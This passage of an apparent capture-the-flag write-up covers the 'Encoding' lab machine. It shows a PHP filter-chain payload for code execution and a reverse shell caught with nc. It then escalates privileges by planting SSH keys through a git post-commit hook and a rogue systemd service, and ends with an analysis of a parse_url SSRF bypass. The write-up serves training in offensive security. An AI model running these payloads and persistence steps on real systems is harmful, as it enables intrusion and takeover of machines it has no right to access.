.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

I’ll replace the filters in Repeater, and start `nc` listening. On sending, I get a shell as www-data:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.198 35760
bash: cannot set terminal process group (800): Inappropriate ioctl for device
bash: no job control in this shell
www-data@encoding:~/image/actions$

```

I’ll upgrade the shell with the [script / stty trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@encoding:~/image/actions$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
sh: 0: getcwd() failed: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@encoding:$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@encoding:$ 

```

## Shell as svc

### Enumeration

#### sudo

I noticed that the website was running `sudo` to run `git` commands in the script. That is visible with `sudo -l`:

```

www-data@encoding:$ sudo -l      
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh

```

`git-commit.sh` checks for files that different from the previous commit. If there are files, it adds them. If not, it commits the current changes.

```

#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi

```

#### Writable Location

Within the `image` directory, the only place I can write is in the `.git` folder. At first it looks like I www-data wouldn’t be able to write:

```

www-data@encoding:~/image$ ls -ld .git/
drwxrwxr-x+ 8 svc svc 4096 Apr 12 15:21 .git/

```

The `+` means there are extended attributes:

```

www-data@encoding:~/image$ getfacl .git/
# file: .git/
# owner: svc
# group: svc
user::rwx
user:www-data:rwx
group::r-x
mask::rwx
other::r-x

```

www-data has read, write, and execute. There’s no where else in `image` that www-data can write:

```

www-data@encoding:~/image$ find . -path ./.git -prune -o -writable -print
www-data@encoding:~/image$ 

```

### Execution

#### Strategy

With write access to the `.git` folder, I have access to mess with a lot of configuration for the repo. With the `sudo` configuration, I can add and commit files to the repo. There are probably many ways to get execution from this setup.

One way is to use a post-commit hook, which is a script that runs when files are committed. To commit, I’ll need modified files. Typically files are only added to the repo from within the directory containing the `.git` directory (and any subfolders). I’ll modify git to allow files from other locations, and then trigger the commit using the script.

#### Add Hook

This `echo` line pipped into `tee` will write a `bash` script to `.git/hooks/post-commit`:

```

www-data@encoding:~/image$ echo -e 'mkdir -p /home/svc/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /home/svc/.ssh/authorized_keys\nchmod 600 /home/svc/.ssh/authorized_keys' | tee .git/hooks/post-commit        
mkdir -p /home/svc/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /home/svc/.ssh/authorized_keys
chmod 600 /home/svc/.ssh/authorized_keys
www-data@encoding:~/image$ chmod +x .git/hooks/post-commit

```

I’ll also set it executable. This script writes a public SSH key into svc’s `authorized_keys` file.

#### Make Changes

In order to commit, I’ll need to have some changes in the repo. Changes in the `.git` folder do not count, as that’s metadata about the repo.

```

www-data@encoding:~/image$ git status
On branch master
nothing to commit, working tree clean

```

The `--work-tree` argument allows me to specify a directory to consider part of the repo. I’ll add `/etc/hostname`:

```

www-data@encoding:~/image$ git --work-tree /etc/ add /etc/hostname 
www-data@encoding:~/image$ git status
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   hostname

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    hostname

```

Not it shows up as new and deleted (which is a bit weird, but I’m doing weird things with `git`).

#### Trigger

`sudo` and the script will commit to the repo now since there are changes to be committed.

```

www-data@encoding:~/image$ sudo -u svc /var/www/image/scripts/git-commit.sh
[master b40dd01] Commited from API!
 1 file changed, 1 insertion(+)
 create mode 100644 hostname

```

It works, and I can SSH as svc:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen svc@haxtables.htb
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-58-generic x86_64)
...[snip]...
svc@encoding:~$ 

```

And get the user flag:

```

svc@encoding:~$ cat user.txt
20861ae5************************

```

There’s also a SSH key in the user’s home directory which I can grab for future use (if I overwrite the previous `authorized_keys` I’ll need to re-add `id_rsa.pub`):

```

svc@encoding:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts

```

## Shell as root

### Enumeration

#### sudo

svc can run restart services as root using `systemctl`:

```

svc@encoding:~$ sudo -l
Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *

```

#### /etc/systemd

Services are defined in files in `/etc/systemd`:

```

svc@encoding:/etc/systemd$ ls
journald.conf  logind.conf  network  networkd.conf  pstore.conf  resolved.conf  sleep.conf  system  system.conf  timesyncd.conf  user  user.conf

```

svc can’t write directly in `systemd`:

```

svc@encoding:/etc/systemd$ ls
journald.conf  logind.conf  network  networkd.conf  pstore.conf  resolved.conf  sleep.conf  system  system.conf  timesyncd.conf  user  user.conf

```

Nor in the subfolders, except `system` has extended attributes:

```

svc@encoding:/etc/systemd$ ls -l
total 48
-rw-r--r--   1 root root 1282 Apr  7  2022 journald.conf
-rw-r--r--   1 root root 1374 Apr  7  2022 logind.conf
drwxr-xr-x   2 root root 4096 Apr  7  2022 network
-rw-r--r--   1 root root  846 Mar 11  2022 networkd.conf
-rw-r--r--   1 root root  670 Mar 11  2022 pstore.conf
-rw-r--r--   1 root root 1406 Apr  7  2022 resolved.conf
-rw-r--r--   1 root root  931 Mar 11  2022 sleep.conf
drwxrwxr-x+ 22 root root 4096 Apr 12 15:21 system
-rw-r--r--   1 root root 1993 Apr  7  2022 system.conf
-rw-r--r--   1 root root  748 Apr  7  2022 timesyncd.conf
drwxr-xr-x   4 root root 4096 Jan 13 12:47 user
-rw-r--r--   1 root root 1394 Apr  7  2022 user.conf

```

svc can’t read, but can write to `system`:

```

svc@encoding:/etc/systemd$ getfacl system
# file: system
# owner: root
# group: root
user::rwx
user:svc:-wx
group::rwx
mask::rwx
other::r-x

```

As www-data can, I can still see what’s in this directory:

```

www-data@encoding:/etc/systemd/system$ ls
cloud-final.service.wants                   display-manager.service.wants  multi-user.target.wants         rescue.target.wants     snap-snapd-17336.mount            sshd-keygen@.service.d
cloud-init.target.wants                     emergency.target.wants         multipath-tools.service         sleep.target.wants      snap.lxd.activate.service         sshd.service
dbus-org.freedesktop.ModemManager1.service  final.target.wants             network-online.target.wants     snap-core20-1634.mount  snap.lxd.daemon.service           sudo.service
dbus-org.freedesktop.resolve1.service       getty.target.wants             oem-config.service.wants        snap-core20-1695.mount  snap.lxd.daemon.unix.socket       sysinit.target.wants
dbus-org.freedesktop.thermald.service       graphical.target.wants         open-vm-tools.service.requires  snap-lxd-22923.mount    snap.lxd.user-daemon.service      syslog.service
dbus-org.freedesktop.timesync1.service      iscsi.service                  paths.target.wants              snap-lxd-23541.mount    snap.lxd.user-daemon.unix.socket  timers.target.wants
default.target.wants                        mdmonitor.service.wants        pm2-root.service                snap-snapd-16010.mount  sockets.target.wants              vmtoolsd.service

```

### Services

The `.wants` files define which services the service relies on so that it can start in the right order on boot. The `.service` files define a service. For example, `pm2-root.service`:

```

[Unit]
Description=PM2 process manager
Documentation=https://pm2.keymetrics.io/
After=network.target

[Service]
Type=forking
User=root
LimitNOFILE=infinity
LimitNPROC=infinity
LimitCORE=infinity
Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
Environment=PM2_HOME=/root/.pm2
PIDFile=/root/.pm2/pm2.pid
Restart=on-failure

ExecStart=/usr/local/lib/node_modules/pm2/bin/pm2 resurrect
ExecReload=/usr/local/lib/node_modules/pm2/bin/pm2 reload all
ExecStop=/usr/local/lib/node_modules/pm2/bin/pm2 kill

[Install]
WantedBy=multi-user.target

```

It sets up the user, the environment, and the commands that run on start, reload, and stop.

### Exploit

svc can edit files like `pm2-root.service`, but that risks taking down the webserver for the box. I’ll make my own. ChatGPT will give me a quick template:

[![image-20230412125943657](/img/image-20230412125943657.png)*Click for full size image*](/img/image-20230412125943657.png)

I’ll use `vim` as svc to write the service:

```

svc@encoding:/etc/systemd$ vim system/0xdf.service

```

As www-data I’ll verify it’s correct:

```

www-data@encoding:/etc/systemd/system$ cat 0xdf.service 
[Unit]
Description=0xdf command service

[Service]
ExecStart=/tmp/0xdf
Type=simple
Restart=always

[Install]
WantedBy=multi-user.target

```

`/tmp/0xdf` will look very similar to the git hook from earlier:

```

#!/bin/bash

mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
touch /tmp/script_ran

```

And I’ll make sure to `chmod +x /tmp/0xdf`.

Now I’ll restart the service, and `script_ran` is now present on the box:

```

svc@encoding:/etc/systemd$ sudo systemctl restart 0xdf
svc@encoding:/etc/systemd$ ls -l /tmp/script_ran 
-rw-r--r-- 1 root root 0 Apr 12 17:19 /tmp/script_ran

```

That’s a good indication that the script executed as root.

SSH works as well:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@haxtables.htb
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-58-generic x86_64)
...[snip]...
root@encoding:~#

```

And I can get `root.txt`:

```

root@encoding:~# cat root.txt
52e6c280************************

```

## Beyond Root

### Background

When I was talking to IppSec about how I solved this, he was surprised I used `handler.php` to get the SSRF working. “Why didn’t you just use the `file_url` argument in `/v3/tools/string/index.php`?” he asked.

But I [tried that above](#ssrf-failsort-of)! It didn’t work. On comparing notes, the difference was this: my URL started with `http://`, and his didn’t!

### Analysis

I’ll play around with this in [this video](https://www.youtube.com/watch?v=sXMqrgsf0b8)):

The summary is that PHP’s [parse\_url](https://www.php.net/manual/en/function.parse-url.php) function, despite it’s claim that “Partial and invalid URLs are also accepted, **parse\_url()** tries its best to parse them correctly”, fails when the scheme is missing entirely, and returns nothing:

```

php > echo parse_url('http://image.haxtables.htb', PHP_URL_HOST);
image.haxtables.htb
php > echo parse_url('image.haxtables.htb', PHP_URL_HOST);
php > 

```

That means that this check works as expected with `http://image.haxtables.htb`, but is bypassed when given `image.haxtables.htb`:

```

    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        jsonify(["message" => "Unacceptable URL"]);
    }

```